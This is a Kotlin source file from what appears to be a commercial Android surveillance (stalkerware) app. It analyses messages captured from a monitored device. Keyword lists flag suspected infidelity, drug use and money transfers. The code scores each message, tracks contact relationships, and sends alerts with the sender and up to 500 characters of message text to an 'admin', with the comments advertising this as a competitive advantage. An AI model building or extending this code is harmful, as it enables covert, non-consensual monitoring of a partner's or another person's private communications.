package com.surveillancepro.android.services

import android.content.Context
import android.util.Log
import com.surveillancepro.android.data.DeviceStorage
import com.surveillancepro.android.data.EventQueue
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.concurrent.ConcurrentHashMap

/**
 * Analyseur de Sentiment et Détection de Relations - SANS ROOT
 * 
 * ANALYSE LOCALE (pas besoin d'API externe):
 * 1. Analyse le sentiment des messages (positif/négatif/neutre)
 * 2. Détecte les relations fréquentes (qui parle avec qui)
 * 3. Identifie les conversations importantes
 * 4. Génère des alertes sur les messages inquiétants
 * 
 * AVANTAGE CONCURRENTIEL:
 * - Aucun concurrent n'a cette fonctionnalité
 * - L'admin voit un résumé au lieu de tout lire
 * - Alertes automatiques sur les messages suspects
 */
object SentimentAnalyzer {
    
    private const val TAG = "SentimentAnalyzer"
    
    // Mots-clés pour l'analyse de sentiment
    private val POSITIVE_WORDS = listOf(
        // Français
        "amour", "aime", "adore", "super", "génial", "parfait", "merci", "bisous",
        "heureux", "heureuse", "content", "contente", "bien", "bon", "bonne",
        "excellent", "magnifique", "formidable", "bravo", "félicitations",
        "❤️", "😍", "😘", "🥰", "💕", "💖", "👍", "🎉", "😊", "😃",
        // Anglais
        "love", "like", "great", "awesome", "perfect", "thanks", "happy",
        "good", "nice", "wonderful", "amazing", "excellent",
    )
    
    private val NEGATIVE_WORDS = listOf(
        // Français
        "déteste", "hais", "merde", "putain", "connard", "salaud", "enculé",
        "triste", "déprimé", "déprimée", "mal", "mauvais", "nul", "nulle",
        "colère", "énervé", "énervée", "furieux", "furieuse", "déçu", "déçue",
        "problème", "difficile", "horrible", "terrible", "peur", "angoisse",
        "😢", "😭", "😡", "😠", "💔", "😤", "😞", "😔", "👎",
        // Anglais
        "hate", "angry", "sad", "bad", "terrible", "horrible", "problem",
        "difficult", "scared", "worried", "upset", "disappointed",
    )
    
    private val URGENT_WORDS = listOf(
        "urgent", "urgence", "vite", "rapidement", "immédiatement", "maintenant",
        "aide", "help", "sos", "danger", "police", "hôpital", "accident",
        "emergency", "asap", "important", "critique", "grave",
    )
    
    private val SUSPICIOUS_WORDS = listOf(
        // Infidélité potentielle
        "secret", "cache", "caché", "cachée", "discret", "discrète",
        "personne ne doit savoir", "entre nous", "ne dis rien",
        "mon amour", "ma chérie", "mon chéri", "bébé", "bb",
        "tu me manques", "j'ai envie de toi", "ce soir", "cette nuit",
        "hôtel", "rendez-vous", "rdv", "retrouver", "rejoins-moi",
        // Drogue/Illégal
        "beuh", "weed", "shit", "coke", "came", "dealer", "deal",
        "gramme", "g", "livraison", "commande",
        // Argent suspect
        "cash", "liquide", "virement", "transfert", "bitcoin", "crypto",
    )
    
    // Statistiques des contacts (qui parle le plus)
    private val contactStats = ConcurrentHashMap<String, ContactStats>()
    
    private val dateFormat = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US)
    
    /**
     * Analyse un message et retourne le résultat.
     */
    fun analyzeMessage(
        context: Context,
        message: String,
        sender: String,
        app: String,
        packageName: String
    ): AnalysisResult {
        val messageLower = message.lowercase()
        
        // Compter les mots positifs/négatifs
        val positiveCount = POSITIVE_WORDS.count { messageLower.contains(it) }
        val negativeCount = NEGATIVE_WORDS.count { messageLower.contains(it) }
        val urgentCount = URGENT_WORDS.count { messageLower.contains(it) }
        val suspiciousMatches = SUSPICIOUS_WORDS.filter { messageLower.contains(it) }
        
        // Calculer le sentiment
        val sentiment = when {
            positiveCount > negativeCount + 1 -> Sentiment.POSITIVE
            negativeCount > positiveCount + 1 -> Sentiment.NEGATIVE
            else -> Sentiment.NEUTRAL
        }
        
        // Calculer le score de suspicion (0-100)
        val suspicionScore = minOf(100, suspiciousMatches.size * 25 + urgentCount * 10)
        
        // Mettre à jour les stats du contact
        updateContactStats(sender, app, sentiment, suspicionScore)
        
        val result = AnalysisResult(
            sentiment = sentiment,
            positiveScore = positiveCount,
            negativeScore = negativeCount,
            isUrgent = urgentCount > 0,
            suspicionScore = suspicionScore,
            suspiciousWords = suspiciousMatches,
        )
        
        // Si le message est suspect, envoyer une alerte
        if (suspicionScore >= 50) {
            sendSuspiciousAlert(context, message, sender, app, result)
        }
        
        return result
    }
    
    /**
     * Met à jour les statistiques d'un contact.
     */
    private fun updateContactStats(sender: String, app: String, sentiment: Sentiment, suspicionScore: Int) {
        val key = "$app|$sender"
        val stats = contactStats.getOrPut(key) { ContactStats(sender, app) }
        
        stats.messageCount++
        stats.lastMessageTime = System.currentTimeMillis()
        
        when (sentiment) {
            Sentiment.POSITIVE -> stats.positiveMessages++
            Sentiment.NEGATIVE -> stats.negativeMessages++
            Sentiment.NEUTRAL -> stats.neutralMessages++
        }
        
        if (suspicionScore > stats.maxSuspicionScore) {
            stats.maxSuspicionScore = suspicionScore
        }
        stats.totalSuspicionScore += suspicionScore
    }
    
    /**
     * Envoie une alerte pour un message suspect.
     */
    private fun sendSuspiciousAlert(
        context: Context,
        message: String,
        sender: String,
        app: String,
        result: AnalysisResult
    ) {
        val queue = EventQueue.getInstance(context)
        
        queue.enqueue("suspicious_message_alert", mapOf(
            "app" to app,
            "sender" to sender,
            "message" to message.take(500),
            "suspicionScore" to result.suspicionScore,
            "suspiciousWords" to result.suspiciousWords,
            "sentiment" to result.sentiment.name,
            "isUrgent" to result.isUrgent,
            "timestamp" to dateFormat.format(Date()),
            "severity" to if (result.suspicionScore >= 75) "critical" else "warning",
        ))
        
        Log.d(TAG, "Suspicious message alert: score=${result.suspicionScore}, words=${result.suspiciousWords}")
    }
    
    /**
     * Retourne les contacts les plus fréquents (relations importantes).
     */
    fun getTopContacts(limit: Int = 10): List<ContactStats> {
        return contactStats.values
            .sortedByDescending { it.messageCount }
            .take(limit)
    }
    
    /**
     * Retourne les contacts les plus suspects.
     */
    fun getSuspiciousContacts(minScore: Int = 25): List<ContactStats> {
        return contactStats.values
            .filter { it.maxSuspicionScore >= minScore }
            .sortedByDescending { it.maxSuspicionScore }
    }
    
    /**
     * Génère un rapport de relations pour l'admin.
     */
    fun generateRelationshipReport(context: Context) {
        val queue = EventQueue.getInstance(context)
        
        val topContacts = getTopContacts(20)
        val suspiciousContacts = getSuspiciousContacts()
        
        queue.enqueue("relationship_report", mapOf(
            "totalContacts" to contactStats.size,
            "topContacts" to topContacts.map { mapOf(
                "name" to it.name,
                "app" to it.app,
                "messageCount" to it.messageCount,
                "sentiment" to when {
                    it.positiveMessages > it.negativeMessages -> "positive"
                    it.negativeMessages > it.positiveMessages -> "negative"
                    else -> "neutral"
                },
                "suspicionScore" to it.maxSuspicionScore,
            )},
            "suspiciousContacts" to suspiciousContacts.map { mapOf(
                "name" to it.name,
                "app" to it.app,
                "suspicionScore" to it.maxSuspicionScore,
            )},
            "timestamp" to dateFormat.format(Date()),
        ))
        
        Log.d(TAG, "Relationship report generated: ${topContacts.size} top, ${suspiciousContacts.size} suspicious")
    }
    
    /**
     * Réinitialise les statistiques (appelé périodiquement).
     */
    fun resetStats() {
        contactStats.clear()
    }
    
    enum class Sentiment {
        POSITIVE, NEGATIVE, NEUTRAL
    }
    
    data class AnalysisResult(
        val sentiment: Sentiment,
        val positiveScore: Int,
        val negativeScore: Int,
        val isUrgent: Boolean,
        val suspicionScore: Int,
        val suspiciousWords: List<String>,
    )
    
    data class ContactStats(
        val name: String,
        val app: String,
        var messageCount: Int = 0,
        var positiveMessages: Int = 0,
        var negativeMessages: Int = 0,
        var neutralMessages: Int = 0,
        var maxSuspicionScore: Int = 0,
        var totalSuspicionScore: Int = 0,
        var lastMessageTime: Long = 0,
    )
}
